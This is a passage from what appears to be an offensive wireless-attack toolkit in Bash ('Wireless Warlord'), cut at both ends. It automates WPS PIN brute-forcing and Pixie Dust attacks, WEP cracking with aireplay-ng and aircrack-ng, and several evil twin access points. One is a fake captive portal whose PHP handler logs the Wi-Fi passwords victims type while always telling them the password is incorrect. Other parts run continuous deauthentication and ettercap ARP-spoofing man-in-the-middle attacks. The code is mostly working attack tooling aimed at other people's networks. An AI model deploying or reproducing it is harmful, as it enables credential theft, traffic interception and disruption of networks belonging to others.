                            xterm -title "Wireless Warlord - Pixie Dust Attack (Reaver)" -bg black -fg green -e "reaver -i $interface -b $target_bssid -c $target_channel -K 1 -vv | tee '$log_session_dir/pixie_dust_reaver.log'" &
                        else
                            xterm -title "Wireless Warlord - Pixie Dust Attack (Bully)" -bg black -fg green -e "bully -b $target_bssid -c $target_channel -d -v 3 $interface | tee '$log_session_dir/pixie_dust_bully.log'" &
                        fi
                        ;;
                    3)
                        # PIN Bruteforce attack
                        dialog --clear \
                            --backtitle "Wireless Warlord ${WW_VERSION}" \
                            --title "🔢 PIN Bruteforce Attack" \
                            --radiolist "Select tool:" \
                            10 60 2 \
                            "1" "Reaver" ON \
                            "2" "Bully" OFF \
                            2>&1 1>&3
                        local tool=$?
                        
                        if [ $tool -eq 0 ]; then
                            xterm -title "Wireless Warlord - PIN Bruteforce (Reaver)" -bg black -fg green -e "reaver -i $interface -b $target_bssid -c $target_channel -vv | tee '$log_session_dir/pin_bruteforce_reaver.log'" &
                        else
                            xterm -title "Wireless Warlord - PIN Bruteforce (Bully)" -bg black -fg green -e "bully -b $target_bssid -c $target_channel $interface | tee '$log_session_dir/pin_bruteforce_bully.log'" &
                        fi
                        ;;
                    4)
                        # Null PIN attack
                        xterm -title "Wireless Warlord - Null PIN Attack" -bg black -fg green -e "reaver -i $interface -b $target_bssid -c $target_channel -p '' -vv | tee '$log_session_dir/null_pin_attack.log'" &
                        ;;
                    5)
                        # Custom PIN attack
                        exec 3>&1
                        local custom_pin=$(dialog \
                            --clear \
                            --backtitle "Wireless Warlord ${WW_VERSION}" \
                            --title "📋 Custom PIN" \
                            --inputbox "Enter WPS PIN to try:" \
                            8 60 \
                            "12345670" \
                            2>&1 1>&3)
                        exit_status=$?
                        exec 3>&-
                        
                        if [ $exit_status -ne $DIALOG_CANCEL ] && [ $exit_status -ne $DIALOG_ESC ]; then
                            xterm -title "Wireless Warlord - Custom PIN Attack" -bg black -fg green -e "reaver -i $interface -b $target_bssid -c $target_channel -p $custom_pin -vv | tee '$log_session_dir/custom_pin_attack.log'" &
                        fi
                        ;;
                esac
                ;;
        esac
    fi
}

# Function for WEP attacks menu
wep_attacks_menu() {
    if [ -z "$interface" ]; then
        dialog --clear \
            --backtitle "Wireless Warlord ${WW_VERSION}" \
            --title "⚠️ No Interface Selected" \
            --msgbox "Please select an interface first." \
            8 40
        return
    fi
    
    local interface_mode=$(get_interface_mode "$interface")
    if [ "$interface_mode" != "monitor" ]; then
        dialog --clear \
            --backtitle "Wireless Warlord ${WW_VERSION}" \
            --title "⚠️ Wrong Interface Mode" \
            --yesno "Interface must be in monitor mode. Would you like to enable monitor mode now?" \
            8 60
            
        if [ $? -eq 0 ]; then
            exec_airmon_ng start "$interface" | dialog --programbox "Enabling monitor mode..." 20 70
            local new_interface=$(get_monitor_mode_interface "$interface")
            if [ -n "$new_interface" ]; then
                interface=$new_interface
                current_interface="($interface)"
            else
                dialog --clear \
                    --backtitle "Wireless Warlord ${WW_VERSION}" \
                    --title "❌ Error" \
                    --msgbox "Failed to enable monitor mode." \
                    8 40
                return
            fi
        else
            return
        fi
    fi
    
    exec 3>&1
    local selection=$(dialog \
        --clear \
        --backtitle "Wireless Warlord ${WW_VERSION}" \
        --title "📊 WEP Attacks" \
        --ok-label "Select" \
        --cancel-label "Back" \
        --menu "Choose attack method:" \
        $HEIGHT $WIDTH 10 \
        "1" "🔄 WEP All-in-One Attack" \
        "2" "📈 Fake Authentication" \
        "3" "📊 ARP Replay Attack" \
        "4" "📉 Fragmentation Attack" \
        "5" "📈 Chop-Chop Attack" \
        "6" "🔑 Caffe-Latte Attack" \
        2>&1 1>&3)
    exit_status=$?
    exec 3>&-
    
    if [ $exit_status -ne $DIALOG_CANCEL ] && [ $exit_status -ne $DIALOG_ESC ]; then
        # For all WEP attacks, first we need to select a target network
        dialog --clear \
            --backtitle "Wireless Warlord ${WW_VERSION}" \
            --title "🎯 Target Selection" \
            --msgbox "A new window will open to scan for networks.\n\nLook for a WEP encrypted network and press Ctrl+C when found." \
            10 60
        
        xterm -title "Wireless Warlord - Network Scan" -bg black -fg green -e "airodump-ng $interface" &
        local scan_pid=$!
        sleep 3
        
        # Ask for target information
        exec 3>&1
        local target_bssid=$(dialog \
            --clear \
            --backtitle "Wireless Warlord ${WW_VERSION}" \
            --title "🎯 Target Selection" \
            --inputbox "Enter BSSID of target WEP network:" \
            8 60 \
            2>&1 1>&3)
        exit_status=$?
        exec 3>&-
        
        if [ $exit_status -eq $DIALOG_CANCEL ] || [ $exit_status -eq $DIALOG_ESC ]; then
            kill $scan_pid 2>/dev/null
            return
        fi
        
        exec 3>&1
        local target_channel=$(dialog \
            --clear \
            --backtitle "Wireless Warlord ${WW_VERSION}" \
            --title "🎯 Target Selection" \
            --inputbox "Enter channel of target WEP network:" \
            8 60 \
            2>&1 1>&3)
        exit_status=$?
        exec 3>&-
        
        if [ $exit_status -eq $DIALOG_CANCEL ] || [ $exit_status -eq $DIALOG_ESC ]; then
            kill $scan_pid 2>/dev/null
            return
        fi
        
        exec 3>&1
        local target_essid=$(dialog \
            --clear \
            --backtitle "Wireless Warlord ${WW_VERSION}" \
            --title "🎯 Target Selection" \
            --inputbox "Enter ESSID (name) of target WEP network:" \
            8 60 \
            2>&1 1>&3)
        exit_status=$?
        exec 3>&-
        
        if [ $exit_status -eq $DIALOG_CANCEL ] || [ $exit_status -eq $DIALOG_ESC ]; then
            kill $scan_pid 2>/dev/null
            return
        fi
        
        # Kill the scanning process
        kill $scan_pid 2>/dev/null
        
        # Perform the selected attack
        case $selection in
            1)
                # WEP All-in-One Attack
                # This combines all WEP attack methods
                
                # First, start airodump-ng to capture IVs
                xterm -title "Wireless Warlord - WEP Capture" -bg black -fg green -geometry 100x25+0+0 -e "airodump-ng --bssid $target_bssid -c $target_channel -w '$log_session_dir/wep_capture' $interface" &
                local capture_pid=$!
                sleep 2
                
                # Then start fake authentication
                xterm -title "Wireless Warlord - Fake Authentication" -bg black -fg yellow -geometry 100x25+0+300 -e "aireplay-ng --fakeauth 0 -a $target_bssid -h $(get_interface_mac $interface) $interface" &
                local fakeauth_pid=$!
                sleep 2
                
                # Start ARP replay attack
                xterm -title "Wireless Warlord - ARP Replay" -bg black -fg red -geometry 100x25+700+0 -e "aireplay-ng --arpreplay -b $target_bssid -h $(get_interface_mac $interface) $interface" &
                local arpreplay_pid=$!
                
                # Start aircrack-ng to crack the key when enough IVs are captured
                xterm -title "Wireless Warlord - WEP Cracking" -bg black -fg green -geometry 100x25+700+300 -e "aircrack-ng -b $target_bssid '$log_session_dir/wep_capture'*.cap" &
                
                # Save attack PIDs for potential cleanup
                echo "$capture_pid $fakeauth_pid $arpreplay_pid" > "$log_session_dir/wep_attack_pids.txt"
                
                dialog --clear \
                    --backtitle "Wireless Warlord ${WW_VERSION}" \
                    --title "🔄 WEP Attack in Progress" \
                    --msgbox "Multiple windows have been opened to perform the WEP attack.\n\nThe attack is now running. This may take some time depending on network traffic.\n\nPress Ctrl+C in windows to close them when done." \
                    12 70
                ;;
            2)
                # Fake Authentication
                xterm -title "Wireless Warlord - Fake Authentication" -bg black -fg yellow -e "aireplay-ng --fakeauth 0 -a $target_bssid -h $(get_interface_mac $interface) $interface" &
                ;;
            3)
                # ARP Replay Attack
                # First start airodump-ng to capture packets
                xterm -title "Wireless Warlord - WEP Capture" -bg black -fg green -geometry 100x25+0+0 -e "airodump-ng --bssid $target_bssid -c $target_channel -w '$log_session_dir/wep_capture' $interface" &
                sleep 2
                
                # Then start the ARP replay attack
                xterm -title "Wireless Warlord - ARP Replay" -bg black -fg red -geometry 100x25+700+0 -e "aireplay-ng --arpreplay -b $target_bssid -h $(get_interface_mac $interface) $interface" &
                ;;
            4)
                # Fragmentation Attack
                xterm -title "Wireless Warlord - Fragmentation Attack" -bg black -fg red -e "aireplay-ng --fragment -b $target_bssid -h $(get_interface_mac $interface) $interface" &
                ;;
            5)
                # Chop-Chop Attack
                xterm -title "Wireless Warlord - Chop-Chop Attack" -bg black -fg red -e "aireplay-ng --chopchop -b $target_bssid -h $(get_interface_mac $interface) $interface" &
                ;;
            6)
                # Caffe-Latte Attack
                xterm -title "Wireless Warlord - Caffe-Latte Attack" -bg black -fg red -e "aireplay-ng --caffe-latte -b $target_bssid -h $(get_interface_mac $interface) $interface" &
                ;;
        esac
    fi
}

# Function for Evil Twin attacks menu
evil_twin_attacks_menu() {
    exec 3>&1
    local selection=$(dialog \
        --clear \
        --backtitle "Wireless Warlord ${WW_VERSION}" \
        --title "⛓️ Evil Twin Attacks" \
        --ok-label "Select" \
        --cancel-label "Back" \
        --menu "Choose attack method:" \
        $HEIGHT $WIDTH 10 \
        "1" "🌐 Basic Evil Twin" \
        "2" "🔒 Captive Portal Evil Twin" \
        "3" "🕵️ Evil Twin + MITM" \
        "4" "🐂 Evil Twin + BeEF Hook" \
        "5" "🎭 Enterprise Evil Twin" \
        2>&1 1>&3)
    exit_status=$?
    exec 3>&-
    
    if [ $exit_status -ne $DIALOG_CANCEL ] && [ $exit_status -ne $DIALOG_ESC ]; then
        # For all Evil Twin attacks, we need a target network
        exec 3>&1
        local selection_method=$(dialog \
            --clear \
            --backtitle "Wireless Warlord ${WW_VERSION}" \
            --title "🎯 Target Selection Method" \
            --radiolist "How would you like to select the target?" \
            10 60 2 \
            "1" "Scan for networks now" ON \
            "2" "Enter details manually" OFF \
            2>&1 1>&3)
        exit_status=$?
        exec 3>&-
        
        if [ $exit_status -eq $DIALOG_CANCEL ] || [ $exit_status -eq $DIALOG_ESC ]; then
            return
        fi
        
        local target_bssid
        local target_essid
        local target_channel
        
        if [ "$selection_method" = "1" ]; then
            # Scan for networks first
            if [ -z "$interface" ]; then
                dialog --clear \
                    --backtitle "Wireless Warlord ${WW_VERSION}" \
                    --title "⚠️ No Interface Selected" \
                    --msgbox "Please select an interface first." \
                    8 40
                return
            fi
            
            dialog --clear \
                --backtitle "Wireless Warlord ${WW_VERSION}" \
                --title "📶 Network Scan" \
                --msgbox "A new window will open to scan for networks.\n\nPress Ctrl+C in that window when you see your target network." \
                10 60
            
            xterm -title "Wireless Warlord - Network Scan" -bg black -fg green -e "airodump-ng $interface" &
            local scan_pid=$!
            sleep 3
            
            # Ask for target information
            exec 3>&1
            target_bssid=$(dialog \
                --clear \
                --backtitle "Wireless Warlord ${WW_VERSION}" \
                --title "🎯 Target Selection" \
                --inputbox "Enter BSSID of target network:" \
                8 60 \
                2>&1 1>&3)
            exit_status=$?
            exec 3>&-
            
            if [ $exit_status -eq $DIALOG_CANCEL ] || [ $exit_status -eq $DIALOG_ESC ]; then
                kill $scan_pid 2>/dev/null
                return
            fi
            
            exec 3>&1
            target_channel=$(dialog \
                --clear \
                --backtitle "Wireless Warlord ${WW_VERSION}" \
                --title "🎯 Target Selection" \
                --inputbox "Enter channel of target network:" \
                8 60 \
                2>&1 1>&3)
            exit_status=$?
            exec 3>&-
            
            if [ $exit_status -eq $DIALOG_CANCEL ] || [ $exit_status -eq $DIALOG_ESC ]; then
                kill $scan_pid 2>/dev/null
                return
            fi
            
            exec 3>&1
            target_essid=$(dialog \
                --clear \
                --backtitle "Wireless Warlord ${WW_VERSION}" \
                --title "🎯 Target Selection" \
                --inputbox "Enter ESSID (name) of target network:" \
                8 60 \
                2>&1 1>&3)
            exit_status=$?
            exec 3>&-
            
            if [ $exit_status -eq $DIALOG_CANCEL ] || [ $exit_status -eq $DIALOG_ESC ]; then
                kill $scan_pid 2>/dev/null
                return
            fi
            
            # Kill the scanning process
            kill $scan_pid 2>/dev/null
        else
            # Manual entry
            exec 3>&1
            target_bssid=$(dialog \
                --clear \
                --backtitle "Wireless Warlord ${WW_VERSION}" \
                --title "🎯 Target Information" \
                --inputbox "Enter target BSSID (XX:XX:XX:XX:XX:XX):" \
                8 60 \
                2>&1 1>&3)
            exit_status=$?
            exec 3>&-
            
            if [ $exit_status -eq $DIALOG_CANCEL ] || [ $exit_status -eq $DIALOG_ESC ]; then
                return
            fi
            
            exec 3>&1
            target_essid=$(dialog \
                --clear \
                --backtitle "Wireless Warlord ${WW_VERSION}" \
                --title "🎯 Target Information" \
                --inputbox "Enter target ESSID (network name):" \
                8 60 \
                2>&1 1>&3)
            exit_status=$?
            exec 3>&-
            
            if [ $exit_status -eq $DIALOG_CANCEL ] || [ $exit_status -eq $DIALOG_ESC ]; then
                return
            fi
            
            exec 3>&1
            target_channel=$(dialog \
                --clear \
                --backtitle "Wireless Warlord ${WW_VERSION}" \
                --title "🎯 Target Information" \
                --inputbox "Enter target channel:" \
                8 60 \
                "1" \
                2>&1 1>&3)
            exit_status=$?
            exec 3>&-
            
            if [ $exit_status -eq $DIALOG_CANCEL ] || [ $exit_status -eq $DIALOG_ESC ]; then
                return
            fi
        fi
        
        # Save target info for later use
        echo "$target_bssid" > "$log_session_dir/target_bssid.txt"
        echo "$target_channel" > "$log_session_dir/target_channel.txt"
        echo "$target_essid" > "$log_session_dir/target_essid.txt"
        
        # Execute the selected evil twin attack
        case $selection in
            1)
                # Basic Evil Twin Attack
                evil_twin_basic "$target_essid" "$target_channel"
                ;;
            2)
                # Captive Portal Evil Twin
                evil_twin_captive_portal "$target_essid" "$target_channel" "$target_bssid"
                ;;
            3)
                # Evil Twin + MITM
                evil_twin_mitm "$target_essid" "$target_channel" "$target_bssid"
                ;;
            4)
                # Evil Twin + BeEF Hook
                evil_twin_beef "$target_essid" "$target_channel" "$target_bssid"
                ;;
            5)
                # Enterprise Evil Twin
                evil_twin_enterprise "$target_essid" "$target_channel"
                ;;
        esac
    fi
}

# Function to perform basic Evil Twin attack
evil_twin_basic() {
    local essid=$1
    local channel=$2
    
    # Check if required tools are available
    local missing_tools=""
    for tool in hostapd dnsmasq; do
        if ! command -v $tool &> /dev/null; then
            missing_tools="$missing_tools $tool"
        fi
    done
    
    if [ -n "$missing_tools" ]; then
        dialog --clear \
            --backtitle "Wireless Warlord ${WW_VERSION}" \
            --title "❌ Missing Tools" \
            --msgbox "The following required tools are missing:$missing_tools\n\nPlease install them to continue." \
            10 60
        return
    fi
    
    # Create hostapd configuration file
    cat > "$log_session_dir/hostapd.conf" << EOF
interface=$interface
driver=nl80211
ssid=$essid
hw_mode=g
channel=$channel
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
EOF
    
    # Create dnsmasq configuration file
    cat > "$log_session_dir/dnsmasq.conf" << EOF
interface=$interface
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
listen-address=192.168.1.1
EOF
    
    # Set up network configuration
    dialog --clear \
        --backtitle "Wireless Warlord ${WW_VERSION}" \
        --title "🌐 Setting Up Network" \
        --infobox "Configuring network for Evil Twin attack..." \
        5 60
    
    # Configure interface
    ifconfig $interface up 192.168.1.1 netmask 255.255.255.0
    
    # Start hostapd and dnsmasq
    xterm -title "Wireless Warlord - AP (hostapd)" -bg black -fg green -geometry 100x25+0+0 -e "hostapd '$log_session_dir/hostapd.conf'" &
    local hostapd_pid=$!
    
    sleep 2
    
    xterm -title "Wireless Warlord - DHCP (dnsmasq)" -bg black -fg yellow -geometry 100x25+500+0 -e "dnsmasq -C '$log_session_dir/dnsmasq.conf' -d" &
    local dnsmasq_pid=$!
    
    # Save PIDs for cleanup
    echo "$hostapd_pid $dnsmasq_pid" > "$log_session_dir/et_process_pids.txt"
    
    dialog --clear \
        --backtitle "Wireless Warlord ${WW_VERSION}" \
        --title "✅ Evil Twin Access Point Active" \
        --msgbox "Evil Twin AP is now active with ESSID: $essid\n\nIP: 192.168.1.1\nChannel: $channel\n\nPress OK to stop the attack." \
        10 60
    
    # Cleanup when user presses OK
    kill $hostapd_pid $dnsmasq_pid 2>/dev/null
    ifconfig $interface down
    
    dialog --clear \
        --backtitle "Wireless Warlord ${WW_VERSION}" \
        --title "🛑 Attack Stopped" \
        --msgbox "Evil Twin attack has been stopped." \
        8 40
}

# Function to perform Captive Portal Evil Twin attack
evil_twin_captive_portal() {
    local essid=$1
    local channel=$2
    local bssid=$3
    
    # Check if required tools are available
    local missing_tools=""
    for tool in hostapd dnsmasq lighttpd; do
        if ! command -v $tool &> /dev/null; then
            missing_tools="$missing_tools $tool"
        fi
    done
    
    if [ -n "$missing_tools" ]; then
        dialog --clear \
            --backtitle "Wireless Warlord ${WW_VERSION}" \
            --title "❌ Missing Tools" \
            --msgbox "The following required tools are missing:$missing_tools\n\nPlease install them to continue." \
            10 60
        return
    fi
    
    # Create hostapd configuration file
    cat > "$log_session_dir/hostapd.conf" << EOF
interface=$interface
driver=nl80211
ssid=$essid
hw_mode=g
channel=$channel
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
EOF
    
    # Create dnsmasq configuration file
    cat > "$log_session_dir/dnsmasq.conf" << EOF
interface=$interface
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
address=/#/192.168.1.1
log-queries
log-dhcp
listen-address=127.0.0.1
listen-address=192.168.1.1
EOF
    
    # Create lighttpd configuration file
    mkdir -p "$log_session_dir/www"
    cat > "$log_session_dir/lighttpd.conf" << EOF
server.document-root = "$log_session_dir/www"
server.port = 80
server.bind = "192.168.1.1"
server.errorlog = "$log_session_dir/lighttpd-error.log"
server.modules = (
    "mod_access",
    "mod_accesslog",
    "mod_redirect"
)
accesslog.filename = "$log_session_dir/lighttpd-access.log"
index-file.names = ( "index.html" )

# Redirect everything to the captive portal
\$HTTP["host"] =~ ".*" {
    url.redirect = ( "^(.*)$" => "http://192.168.1.1/index.html" )
}
EOF
    
    # Create captive portal HTML
    cat > "$log_session_dir/www/index.html" << EOF
<!DOCTYPE html>
<html>
<head>
    <title>$essid - WiFi Authentication</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f5f5f5;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
            padding: 30px;
            width: 360px;
            max-width: 90%;
        }
        h1 {
            color: #333;
            margin-top: 0;
            font-size: 24px;
            text-align: center;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: #555;
        }
        input[type="password"] {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-sizing: border-box;
            font-size: 16px;
        }
        button {
            background-color: #0078D7;
            color: white;
            border: none;
            border-radius: 5px;
            padding: 12px 20px;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
            font-weight: 500;
        }
        button:hover {
            background-color: #0063B1;
        }
        .logo {
            text-align: center;
            margin-bottom: 20px;
        }
        .logo span {
            font-size: 40px;
        }
        .error {
            color: #e74c3c;
            text-align: center;
            margin-top: 15px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <span>📶</span>
        </div>
        <h1>WiFi Authentication Required</h1>
        <p>To connect to $essid, please enter the network password:</p>
        
        <form id="wifi-form" action="check.php" method="post">
            <div class="form-group">
                <label for="password">Network Password:</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit">Connect</button>
        </form>
        
        <p id="error-message" class="error">Incorrect password. Please try again.</p>
    </div>

    <script>
        document.getElementById('wifi-form').addEventListener('submit', function(e) {
            e.preventDefault();
            
            var password = document.getElementById('password').value;
            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'check.php', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.onload = function() {
                document.getElementById('error-message').style.display = 'block';
                setTimeout(function() {
                    document.getElementById('password').value = '';
                }, 2000);
            };
            xhr.send('password=' + encodeURIComponent(password));
        });
    </script>
</body>
</html>
EOF
    
    # Create PHP handler (we'll use a simple bash script to log passwords)
    cat > "$log_session_dir/www/check.php" << EOF
<?php
if(isset(\$_POST['password'])) {
    \$password = \$_POST['password'];
    \$file = fopen("../captured_passwords.txt", "a");
    fwrite(\$file, date("Y-m-d H:i:s") . " - Password: " . \$password . "\n");
    fclose(\$file);
    echo "Incorrect password. Please try again.";
}
?>
EOF
    
    # Set up network configuration
    dialog --clear \
        --backtitle "Wireless Warlord ${WW_VERSION}" \
        --title "🌐 Setting Up Network" \
        --infobox "Configuring network for Captive Portal attack..." \
        5 60
    
    # Configure interface
    ifconfig $interface up 192.168.1.1 netmask 255.255.255.0
    
    # Set up iptables for redirection
    iptables -t nat -F
    iptables -F
    iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:80
    iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 192.168.1.1:80
    
    # Start hostapd, dnsmasq, and lighttpd
    xterm -title "Wireless Warlord - AP (hostapd)" -bg black -fg green -geometry 100x25+0+0 -e "hostapd '$log_session_dir/hostapd.conf'" &
    local hostapd_pid=$!
    
    sleep 2
    
    xterm -title "Wireless Warlord - DHCP (dnsmasq)" -bg black -fg yellow -geometry 100x25+0+300 -e "dnsmasq -C '$log_session_dir/dnsmasq.conf' -d" &
    local dnsmasq_pid=$!
    
    sleep 2
    
    xterm -title "Wireless Warlord - Web Server (lighttpd)" -bg black -fg cyan -geometry 100x25+500+0 -e "lighttpd -D -f '$log_session_dir/lighttpd.conf'" &
    local lighttpd_pid=$!
    
    # Deauthentication attack to force clients to connect to our AP
    dialog --clear \
        --backtitle "Wireless Warlord ${WW_VERSION}" \
        --title "💣 Deauthentication Attack" \
        --yesno "Would you like to start a deauthentication attack to force clients to connect to your Evil Twin?" \
        8 60
    
    if [ $? -eq 0 ]; then
        xterm -title "Wireless Warlord - Deauth Attack" -bg black -fg red -geometry 100x25+500+300 -e "aireplay-ng --deauth 0 -a $bssid $interface" &
        local deauth_pid=$!
        echo "$deauth_pid" >> "$log_session_dir/et_process_pids.txt"
    fi
    
    # Save PIDs for cleanup
    echo "$hostapd_pid $dnsmasq_pid $lighttpd_pid" > "$log_session_dir/et_process_pids.txt"
    
    # Monitor for captured passwords
    xterm -title "Wireless Warlord - Password Monitor" -bg black -fg green -geometry 100x15+500+400 -e "tail -f '$log_session_dir/captured_passwords.txt' 2>/dev/null || echo 'Waiting for passwords...' > '$log_session_dir/captured_passwords.txt' && tail -f '$log_session_dir/captured_passwords.txt'" &
    local tail_pid=$!
    echo "$tail_pid" >> "$log_session_dir/et_process_pids.txt"
    
    dialog --clear \
        --backtitle "Wireless Warlord ${WW_VERSION}" \
        --title "✅ Captive Portal Active" \
        --msgbox "Evil Twin Captive Portal is now active.\n\nESSID: $essid\nIP: 192.168.1.1\nChannel: $channel\n\nCapture file: $log_session_dir/captured_passwords.txt\n\nPress OK to stop the attack." \
        12 60
    
    # Cleanup when user presses OK
    kill $(cat "$log_session_dir/et_process_pids.txt") 2>/dev/null
    ifconfig $interface down
    iptables -t nat -F
    iptables -F
    
    # Show captured passwords if any
    if [ -f "$log_session_dir/captured_passwords.txt" ] && [ -s "$log_session_dir/captured_passwords.txt" ]; then
        dialog --clear \
            --backtitle "Wireless Warlord ${WW_VERSION}" \
            --title "🔑 Captured Passwords" \
            --textbox "$log_session_dir/captured_passwords.txt" \
            15 70
    else
        dialog --clear \
            --backtitle "Wireless Warlord ${WW_VERSION}" \
            --title "ℹ️ Information" \
            --msgbox "No passwords were captured during the attack." \
            8 40
    fi
    
    dialog --clear \
        --backtitle "Wireless Warlord ${WW_VERSION}" \
        --title "🛑 Attack Stopped" \
        --msgbox "Evil Twin Captive Portal attack has been stopped.\n\nAll logs saved in: $log_session_dir" \
        8 60
}

# Function for Evil Twin + MITM attack
evil_twin_mitm() {
    local essid=$1
    local channel=$2
    local bssid=$3
    
    # Check if required tools are available
    local missing_tools=""
    for tool in hostapd dnsmasq iptables ettercap; do
        if ! command -v $tool &> /dev/null; then
            missing_tools="$missing_tools $tool"
        fi
    done
    
    if [ -n "$missing_tools" ]; then
        dialog --clear \
            --backtitle "Wireless Warlord ${WW_VERSION}" \
            --title "❌ Missing Tools" \
            --msgbox "The following required tools are missing:$missing_tools\n\nPlease install them to continue." \
            10 60
        return
    fi
    
    # Create hostapd configuration file
    cat > "$log_session_dir/hostapd.conf" << EOF
interface=$interface
driver=nl80211
ssid=$essid
hw_mode=g
channel=$channel
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
EOF
    
    # Create dnsmasq configuration file
    cat > "$log_session_dir/dnsmasq.conf" << EOF
interface=$interface
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
listen-address=192.168.1.1
EOF
    
    # Set up network configuration
    dialog --clear \
        --backtitle "Wireless Warlord ${WW_VERSION}" \
        --title "🌐 Setting Up Network" \
        --infobox "Configuring network for MITM attack..." \
        5 60
    
    # Configure interface
    ifconfig $interface up 192.168.1.1 netmask 255.255.255.0
    
    # Enable IP forwarding
    echo 1 > /proc/sys/net/ipv4/ip_forward
    
    # Set up iptables for forwarding
    iptables -t nat -F
    iptables -F
    iptables -t nat -A POSTROUTING -o $(get_internet_interface) -j MASQUERADE
    iptables -A FORWARD -i $interface -j ACCEPT
    
    # Start hostapd and dnsmasq
    xterm -title "Wireless Warlord - AP (hostapd)" -bg black -fg green -geometry 100x25+0+0 -e "hostapd '$log_session_dir/hostapd.conf'" &
    local hostapd_pid=$!
    
    sleep 2
    
    xterm -title "Wireless Warlord - DHCP (dnsmasq)" -bg black -fg yellow -geometry 100x25+0+300 -e "dnsmasq -C '$log_session_dir/dnsmasq.conf' -d" &
    local dnsmasq_pid=$!
    
    # Save PIDs for cleanup
    echo "$hostapd_pid $dnsmasq_pid" > "$log_session_dir/et_process_pids.txt"
    
    # Deauthentication attack
    dialog --clear \
        --backtitle "Wireless Warlord ${WW_VERSION}" \
        --title "💣 Deauthentication Attack" \
        --yesno "Would you like to start a deauthentication attack to force clients to connect to your Evil Twin?" \
        8 60
    
    if [ $? -eq 0 ]; then
        xterm -title "Wireless Warlord - Deauth Attack" -bg black -fg red -geometry 100x25+500+300 -e "aireplay-ng --deauth 0 -a $bssid $interface" &
        local deauth_pid=$!
        echo "$deauth_pid" >> "$log_session_dir/et_process_pids.txt"
    fi
    
    # Launch ettercap for MITM
    xterm -title "Wireless Warlord - MITM (Ettercap)" -bg black -fg red -geometry 100x30+500+0 -e "ettercap -T -q -i $interface -M arp // // | tee '$log_session_dir/ettercap.log'" &
    local ettercap_pid=$!
    echo "$ettercap_pid" >> "$log_session_dir/et_process_pids.txt"
    
    dialog --clear \
        --backtitle "Wireless Warlord ${WW_VERSION}" \
        --title "✅ MITM Attack Active" \
        --msgbox "Evil Twin MITM attack is now active.\n\nESSID: $essid\nIP: 192.168.1.1\nChannel: $channel\n\nLog file: $log_session_dir/ettercap.log\n\nPress OK to stop the attack." \
        12 60
    
    # Cleanup when user presses OK
    kill $(cat "$log_session_dir/et_process_pids.txt") 2>/dev/null
    ifconfig $interface down
    echo 0 > /proc/sys/net/ipv4/ip_forward
    iptables -t nat -F
    iptables -F
    
    dialog --clear \
        --backtitle "Wireless Warlord ${WW_VERSION}" \
        --title "🛑 Attack Stopped" \
        --msgbox "Evil Twin MITM attack has been stopped.\n\nAll logs saved in: $log_session_dir" \
        8 60
}

# Function to get internet-connected interface
get_internet_interface() {
    # Get default route interface
    ip route | grep default | awk '{print $5}' | head -n 1
}

# Function for Enterprise attacks menu
enterprise_attacks_menu() {
    exec 3>&1
    local selection=$(dialog \
        --clear \
        --backtitle "Wireless Warlord ${WW_VERSION}" \
        --title "🏢 Enterprise Attacks" \
        --ok-label "Select" \
        --cancel-label "Back" \
        --menu "Choose attack method:" \
        $HEIGHT $WIDTH 10 \
        "1" "🔐 Hostile Portal (hostapd-wpe)" \
        "2" "🔒 RADIUS MAC Filter Bypass" \
        "3" "📱 Enterprise Network Scan" \
        2>&1 1>&3)
    exit_status=$?
    exec 3>&-
    
    if [ $exit_status -ne $DIALOG_CANCEL ] && [ $exit_status -ne $DIALOG_ESC ]; then
        case $selection in
            1)
                # Hostile Portal attack
                enterprise_hostile_portal
                ;;
            2)
                # RADIUS MAC Filter Bypass
                enterprise_mac_bypass
                ;;
            3)
                # Enterprise Network Scan
                enterprise_scan
                ;;
        esac
    fi
}

# Function for DOS attacks menu
dos_attacks_menu() {
    if [ -z "$interface" ]; then
        dialog --clear \
            --backtitle "Wireless Warlord ${WW_VERSION}" \
            --title "⚠️ No Interface Selected" \
            --msgbox "Please select an interface first." \
            8 40
        return
    fi
    
    local interface_mode=$(get_interface_mode "$interface")
    if [ "$interface_mode" != "monitor" ]; then
        dialog --clear \
            --backtitle "Wireless Warlord ${WW_VERSION}" \
            --title "⚠️ Wrong Interface Mode" \
            --yesno "Interface must be in monitor mode. Would you like to enable monitor mode now?" \
            8 60
            
        if [ $? -eq 0 ]; then
            exec_airmon_ng start "$interface" | dialog --programbox "Enabling monitor mode..." 20 70
            local new_interface=$(get_monitor_mode_interface "$interface")
            if [ -n "$new_interface" ]; then
                interface=$new_interface
                current_interface="($interface)"
            else
                dialog --clear \
                    --backtitle "Wireless Warlord ${WW_VERSION}" \
                    --title "❌ Error" \
                    --msgbox "Failed to enable monitor mode." \
                    8 40
                return
            fi
        else
            return
        fi
    fi
    
    exec 3>&1
    local selection=$(dialog \
        --clear \
        --backtitle "Wireless Warlord ${WW_VERSION}" \
        --title "💥 DoS Attacks" \
